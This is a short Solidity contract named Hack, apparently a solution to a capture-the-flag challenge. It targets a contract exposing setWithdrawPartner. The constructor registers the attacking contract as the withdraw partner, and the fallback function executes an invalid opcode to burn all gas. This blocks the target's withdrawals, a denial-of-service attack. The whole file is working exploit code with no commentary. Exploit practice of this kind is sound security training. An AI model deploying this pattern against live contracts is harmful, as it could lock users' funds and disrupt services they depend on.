pragma solidity ^0.8;

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract Hack {
    constructor(IDenial target) {
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            invalid()
        }
    }
}
